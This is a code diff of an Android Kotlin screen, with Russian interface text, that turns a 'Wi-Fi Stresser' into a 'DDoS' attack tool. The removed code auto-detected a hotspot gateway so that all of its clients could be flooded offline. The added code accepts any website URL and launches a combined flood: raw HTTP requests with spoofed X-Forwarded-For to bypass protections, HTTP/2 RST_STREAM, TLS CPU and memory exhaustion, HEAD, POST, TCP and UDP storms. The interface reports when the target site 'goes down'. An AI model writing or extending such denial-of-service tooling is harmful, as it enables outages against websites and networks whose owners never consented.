@@ -1,8 +1,5 @@
 package com.toolkit.app
 
-import android.content.Context
-import android.net.ConnectivityManager
-import android.net.NetworkCapabilities
 import android.os.Handler
 import android.os.Looper
 import androidx.activity.compose.BackHandler
@@ -36,13 +33,12 @@ import androidx.compose.material3.Text
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
-import androidx.compose.ui.draw.alpha
-import androidx.compose.ui.draw.clip
-import androidx.compose.ui.geometry.Offset
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.Path
 import androidx.compose.ui.graphics.StrokeCap
+import androidx.compose.ui.graphics.StrokeJoin
+import androidx.compose.ui.graphics.drawscope.Fill
 import androidx.compose.ui.graphics.drawscope.Stroke
-import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.ImeAction
@@ -58,46 +54,49 @@ import com.toolkit.app.ui.TextDim
 import com.toolkit.app.ui.TextMain
 import com.toolkit.app.ui.WarnOrange
 import com.toolkit.app.ui.flatButtonElevation
-import java.net.InetAddress
-import java.net.NetworkInterface
+import java.net.URI
 import java.text.SimpleDateFormat
 import java.util.*
 
 @Composable
-fun WifiIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
+fun DdosIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
     val alpha = if (animated) {
-        val t = rememberInfiniteTransition(label = "wifi")
+        val t = rememberInfiniteTransition(label = "ddos")
         val a = t.animateFloat(
             initialValue = 0.35f,
             targetValue = 1f,
-            animationSpec = infiniteRepeatable(tween(700), RepeatMode.Reverse),
+            animationSpec = infiniteRepeatable(tween(650), RepeatMode.Reverse),
             label = "pulse",
         )
         a.value
     } else 1f
     Canvas(modifier = modifier) {
-        val cx = size.width / 2f
-        val cy = size.height * 0.62f
-        val r1 = size.minDimension * 0.13f
-        val r2 = r1 * 1.95f
-        val r3 = r2 * 1.6f
-        val start = 202.5f
-        val sweep = 315f
-        val strokeStyle = Stroke(width = size.minDimension * 0.085f, cap = StrokeCap.Round)
-        drawArc(color.copy(alpha = alpha), start, sweep, false, topLeft = Offset(cx - r3, cy - r3), size = androidx.compose.ui.geometry.Size(r3 * 2, r3 * 2), style = strokeStyle)
-        drawArc(color.copy(alpha = alpha * 0.85f), start, sweep, false, topLeft = Offset(cx - r2, cy - r2), size = androidx.compose.ui.geometry.Size(r2 * 2, r2 * 2), style = strokeStyle)
-        drawArc(color.copy(alpha = alpha * 0.7f), start, sweep, false, topLeft = Offset(cx - r1, cy - r1), size = androidx.compose.ui.geometry.Size(r1 * 2, r1 * 2), style = strokeStyle)
-        drawCircle(color, radius = r1 * 0.62f, center = Offset(cx, cy))
+        val w = size.width
+        val h = size.height
+        val path = Path().apply {
+            moveTo(w * 0.58f, h * 0.02f)
+            lineTo(w * 0.18f, h * 0.60f)
+            lineTo(w * 0.46f, h * 0.60f)
+            lineTo(w * 0.42f, h * 0.98f)
+            lineTo(w * 0.84f, h * 0.42f)
+            lineTo(w * 0.55f, h * 0.42f)
+            close()
+        }
+        drawPath(
+            path,
+            color.copy(alpha = alpha),
+            style = Stroke(width = w * 0.09f, cap = StrokeCap.Round, join = StrokeJoin.Round),
+        )
+        drawPath(path, color.copy(alpha = alpha * 0.16f), style = Fill)
     }
 }
 
 @Composable
-fun WifiStresserScreen(onBack: () -> Unit) {
-    val ctx = LocalContext.current
-    var ip by remember { mutableStateOf("192.168.0.1") }
-    var hotspot by remember { mutableStateOf(false) }
+fun DdosScreen(onBack: () -> Unit) {
+    var url by remember { mutableStateOf("https://example.com") }
     var running by remember { mutableStateOf(false) }
     var snap by remember { mutableStateOf(StresserSnapshot()) }
+    var target by remember { mutableStateOf("") }
     val logs = remember { mutableStateListOf<LogLine>() }
     val listState = rememberLazyListState()
     val engine = remember { mutableStateOf<StresserEngine?>(null) }
@@ -118,38 +117,48 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         if (logs.isNotEmpty()) runCatching { listState.scrollToItem(logs.size - 1) }
     }
 
-    fun stopStresser() {
+    fun stopDdos() {
         running = false
         engine.value?.stop()
         engine.value = null
     }
 
-    fun startStresser() {
-        var h = ip.trim()
-        if (!Regex("^\\d{1,3}(\\.\\d{1,3}){3}\$").matches(h)) {
-            val d = runCatching { InetAddress.getByName(h).hostAddress }.getOrNull()
-            if (d != null) h = d else {
-                addLog("Некорректный IP-адрес: $h", WarnOrange)
-                return
-            }
+    fun startDdos() {
+        val raw = url.trim()
+        if (raw.isEmpty()) {
+            addLog("Введите адрес сайта", WarnOrange)
+            return
+        }
+        var u = raw
+        if (!u.contains("://")) u = "https://$u"
+        val host: String
+        val port: Int
+        try {
+            val uri = URI(u)
+            val h = uri.host ?: throw IllegalArgumentException("нет хоста")
+            host = h
+            port = if (uri.port > 0) uri.port else if (uri.scheme.equals("http", true)) 80 else 443
+        } catch (t: Throwable) {
+            addLog("Некорректный адрес: $raw", WarnOrange)
+            return
         }
         logs.clear()
         wasDropped.value = false
         pingSpiked.value = false
         val ui = Handler(Looper.getMainLooper())
         val e = StresserEngine(
-            host = h,
-            port = 80,
-            withBroadcast = true,
+            host = host,
+            port = port,
+            withBroadcast = false,
             onMetrics = { m ->
                 ui.post {
                     snap = m
                     hist = engine.value?.pingHistory
                     if (!m.dropped) wasDropped.value = false
-                    if (m.pingMs > 1000 && !pingSpiked.value) {
+                    if (m.pingMs > 2000 && !pingSpiked.value) {
                         pingSpiked.value = true
-                        addLog("Пинг подскочил: ${m.pingMs.toInt()} мс", WarnOrange)
-                    } else if (m.pingMs < 400 && pingSpiked.value) {
+                        addLog("Ответы замедлились: ${m.pingMs.toInt()} мс — сайт захлёбывается", WarnOrange)
+                    } else if (m.pingMs < 800 && pingSpiked.value) {
                         pingSpiked.value = false
                     }
                 }
@@ -158,30 +167,16 @@ fun WifiStresserScreen(onBack: () -> Unit) {
             onDrop = {
                 ui.post {
                     wasDropped.value = true
-                    addLog("Интернет упал! Нет ответа от роутера", Color(0xFFFF6B6B))
+                    addLog("Цель не отвечает! Сайт лёг или забанил ваш IP", Color(0xFFFF6B6B))
                 }
             },
         )
+        target = host
         engine.value = e
         running = true
-        addLog("Подключение к сети…", AccentSoft)
+        addLog("Цель: $host:$port (${if (port == 443) "HTTPS" else "HTTP"})", AccentSoft)
+        addLog("Запуск: RAW HTTP + HTTP/2 RST_STREAM + TLS CPU/RAM + HEAD-шторм…", AccentSoft)
         e.start()
-    }
-
-    fun startHotspot() {
-        if (running) {
-            stopStresser()
-            return
-        }
-        val gw = detectGateway(ctx)
-        if (gw == null) {
-            addLog("Не удалось найти шлюз сети. Подключитесь к Wi-Fi или включите раздачу.", WarnOrange)
-            return
-        }
-        ip = gw
-        hotspot = true
-        startStresser()
-        addLog("Раздача интернета найдена: шлюз $gw — стрессирую для всех клиентов", Accent)
     }
 
     Column(
@@ -207,13 +202,13 @@ fun WifiStresserScreen(onBack: () -> Unit) {
             }
             Spacer(Modifier.width(6.dp))
             Text(
-                "Wi-Fi Stresser",
+                "DDoS",
                 color = TextMain,
                 fontSize = 22.sp,
                 fontWeight = FontWeight.Bold,
             )
             Spacer(Modifier.weight(1f))
-            WifiIcon(
+            DdosIcon(
                 modifier = Modifier.size(30.dp),
                 color = if (running) AccentSoft else Accent,
                 animated = running,
@@ -224,30 +219,25 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         GlassCard(modifier = Modifier.fillMaxWidth()) {
             Column(Modifier.padding(16.dp)) {
                 Text(
-                    "Стрессируем сеть без root-прав — комбинированный флуд: TCP, UDP, TLS, POST и broadcast-шторм, всё сразу.",
+                    "Жёсткий комбинированный флуд с одного устройства, без root. " +
+                        "Работает по любому сайту — https и http.",
                     color = TextMain,
                     fontSize = 13.sp,
                     lineHeight = 18.sp,
                 )
                 Spacer(Modifier.height(10.dp))
                 Text(
-                    "• Стресс раздачи интернета — вы сможете ддосить раздачу (хотспот): шлюз найдётся сам, отвалятся все клиенты.\n" +
-                        "• Ручной режим — стресс по IP роутера: пинг, соединения и обрыв сети на графике.",
+                    "• RAW HTTP-шторм — огромное число сырых запросов с подменой X-Forwarded-For (обход защит).\n" +
+                        "• HTTP/2 RST_STREAM — тысячи команд принудительного сброса потоков.\n" +
+                        "• TLS CPU — тяжёлая криптография RSA/ECDHE при каждом рукопожатии жжёт процессор сервера.\n" +
+                        "• TLS RAM — десятки спящих шифрованных соединений заставляют сервер держать контекст сессий.\n" +
+                        "• HEAD-шторм + POST + TCP-churn + UDP + RST — миллион методов в одном.",
                     color = TextDim,
-                    fontSize = 13.sp,
-                    lineHeight = 18.sp,
+                    fontSize = 12.sp,
+                    lineHeight = 17.sp,
                 )
             }
         }
-
-        Spacer(Modifier.height(12.dp))
-        ModeBar(
-            title = "Стресс раздачи интернета",
-            subtitle = "вы сможете ддосить раздачу интернета — найдёт шлюз сам, ляжет для всех",
-            selected = hotspot,
-            running = running,
-            onClick = { startHotspot() },
-        )
 
         Spacer(Modifier.height(12.dp))
         GlassCard(modifier = Modifier.fillMaxWidth()) {
@@ -256,21 +246,22 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                 verticalAlignment = Alignment.CenterVertically,
             ) {
                 OutlinedTextField(
-                    value = ip,
-                    onValueChange = { ip = it },
+                    value = url,
+                    onValueChange = { url = it },
                     modifier = Modifier.weight(1f),
                     singleLine = true,
-                    label = { Text(if (hotspot) "IP роутера (авто)" else "IP роутера", color = TextDim, fontSize = 13.sp) },
+                    label = { Text("Сайт (https://)", color = TextDim, fontSize = 13.sp) },
+                    placeholder = { Text("https://site.com", color = TextDim.copy(alpha = 0.5f), fontSize = 13.sp) },
                     textStyle = MaterialTheme.typography.bodyLarge.copy(
                         color = TextMain,
-                        fontSize = 16.sp,
+                        fontSize = 15.sp,
                         fontFamily = FontFamily.Monospace,
                     ),
                     keyboardOptions = KeyboardOptions(
-                        keyboardType = KeyboardType.Number,
+                        keyboardType = KeyboardType.Uri,
                         imeAction = ImeAction.Done,
                     ),
-                    keyboardActions = KeyboardActions(onDone = { if (!running) startStresser() }),
+                    keyboardActions = KeyboardActions(onDone = { if (!running) startDdos() }),
                     shape = RoundedCornerShape(14.dp),
                     colors = OutlinedTextFieldDefaults.colors(
                         focusedBorderColor = Accent,
@@ -282,7 +273,7 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                 )
                 Spacer(Modifier.width(12.dp))
                 Button(
-                    onClick = { if (running) stopStresser() else if (hotspot) startHotspot() else startStresser() },
+                    onClick = { if (running) stopDdos() else startDdos() },
                     colors = ButtonDefaults.buttonColors(
                         containerColor = if (running) Color(0xFFB3261E) else Accent,
                         contentColor = if (running) Color.White else Color(0xFF0E1013),
@@ -292,7 +283,7 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                     modifier = Modifier.height(54.dp),
                 ) {
                     Text(
-                        if (running) "СТОП" else "СТАРТ",
+                        if (running) "СТОП" else "АТАКА",
                         fontSize = 14.sp,
                         fontWeight = FontWeight.Bold,
                         letterSpacing = 1.sp,
@@ -301,15 +292,26 @@ fun WifiStresserScreen(onBack: () -> Unit) {
             }
         }
 
+        if (target.isNotEmpty()) {
+            Spacer(Modifier.height(10.dp))
+            Text(
+                "Цель: $target  ·  ${
+                    if (snap.okRate > 80) "сервер держится" else if (snap.okRate > 40) "замедляется" else "падает"
+                }",
+                color = TextDim,
+                fontSize = 12.sp,
+            )
+        }
+
         Spacer(Modifier.height(12.dp))
         Row(Modifier.fillMaxWidth()) {
-            StatTile(Modifier.weight(1f), "Скачивание", speedStr(anim.downKBs))
-            Spacer(Modifier.width(8.dp))
             StatTile(Modifier.weight(1f), "Отдача", speedStr(anim.upKBs))
             Spacer(Modifier.width(8.dp))
-            StatTile(Modifier.weight(1f), "Пинг", if (anim.pingMs > 0) "${anim.pingMs.toInt()} мс" else "—")
+            StatTile(Modifier.weight(1f), "Ответ", if (anim.pingMs > 0) "${anim.pingMs.toInt()} мс" else "—")
             Spacer(Modifier.width(8.dp))
             StatTile(Modifier.weight(1f), "Соединения", "${anim.liveConns}")
+            Spacer(Modifier.width(8.dp))
+            StatTile(Modifier.weight(1f), "Успех", "${snap.okRate.toInt()}%")
         }
 
         Spacer(Modifier.height(12.dp))
@@ -317,14 +319,14 @@ fun WifiStresserScreen(onBack: () -> Unit) {
             Column(Modifier.padding(14.dp)) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
                     Text(
-                        "Интернет в реальном времени",
+                        "Сайт в реальном времени",
                         color = TextMain,
                         fontSize = 14.sp,
                         fontWeight = FontWeight.SemiBold,
                     )
                     Spacer(Modifier.weight(1f))
                     if (snap.dropped) {
-                        Text("НЕТ ИНТЕРНЕТА", color = Color(0xFFFF6B6B), fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                        Text("САЙТ НЕ ОТВЕЧАЕТ", color = Color(0xFFFF6B6B), fontSize = 11.sp, fontWeight = FontWeight.Bold)
                     } else {
                         Text(
                             "Успех ${snap.okRate.toInt()}%",
@@ -340,11 +342,11 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                 Row {
                     Box(Modifier.size(8.dp).clip(CircleShape).background(Accent))
                     Spacer(Modifier.width(6.dp))
-                    Text("пинг", color = TextDim, fontSize = 11.sp)
+                    Text("время ответа", color = TextDim, fontSize = 11.sp)
                     Spacer(Modifier.width(14.dp))
                     Box(Modifier.size(8.dp).clip(CircleShape).background(Color(0xFFFF6B6B)))
                     Spacer(Modifier.width(6.dp))
-                    Text("обрыв связи", color = TextDim, fontSize = 11.sp)
+                    Text("нет ответа — сайт лежит", color = TextDim, fontSize = 11.sp)
                 }
             }
         }
@@ -356,7 +358,7 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                 Spacer(Modifier.height(6.dp))
                 if (logs.isEmpty()) {
                     Text(
-                        "Запустите стрессер — здесь появится лог.",
+                        "Вставьте адрес сайта и жмите АТАКА — здесь появится лог.",
                         color = TextDim,
                         fontSize = 12.sp,
                     )
@@ -381,83 +383,5 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                 }
             }
         }
-    }
-}
-
-@Composable
-private fun ModeBar(
-    title: String,
-    subtitle: String,
-    selected: Boolean,
-    running: Boolean,
-    onClick: () -> Unit,
-) {
-    GlassCard(
-        modifier = Modifier
-            .fillMaxWidth()
-            .alpha(if (running) 0.7f else 1f)
-            .clickable(enabled = !running, onClick = onClick),
-    ) {
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(horizontal = 16.dp, vertical = 13.dp),
-            verticalAlignment = Alignment.CenterVertically,
-        ) {
-            Column(Modifier.weight(1f)) {
-                Text(
-                    title,
-                    color = if (selected) Accent else TextMain,
-                    fontSize = 15.sp,
-                    fontWeight = FontWeight.Bold,
-                )
-                Text(
-                    subtitle,
-                    color = TextDim,
-                    fontSize = 11.sp,
-                    lineHeight = 15.sp,
-                    modifier = Modifier.padding(top = 2.dp),
-                )
-            }
-            Spacer(Modifier.width(10.dp))
-            Text("→", color = Accent, fontSize = 18.sp, fontWeight = FontWeight.Bold)
-        }
-    }
-}
-
-private fun detectGateway(context: Context): String? {
-    try {
-        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
-        val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
-        val gw = cm.getLinkProperties(cm.activeNetwork)
-            ?.routes
-            ?.firstOrNull { it.hasGateway() }
-            ?.gateway
-            ?.hostAddress
-        if (isWifi && gw != null) return gw
-    } catch (t: Throwable) {
-    }
-    try {
-        val infs = NetworkInterface.getNetworkInterfaces() ?: return null
-        val list = ArrayList<Pair<String, String>>()
-        for (inf in infs) {
-            if (!inf.isUp || inf.isLoopback) continue
-            val name = inf.name.lowercase(Locale.US)
-            for (a in inf.inetAddresses) {
-                val h = a.hostAddress ?: continue
-                if (h.contains(":")) continue
-                list.add(Pair(name, h))
-            }
-        }
-        for ((name, h) in list) {
-            if (name.contains("ap") || name.contains("softap") || name.contains("swlan")) return h
-        }
-        for ((name, h) in list) {
-            if (name.contains("wlan") || name.contains("eth")) return h
-        }
-        return list.firstOrNull()?.second
-    } catch (t: Throwable) {
-        return null
     }
 }
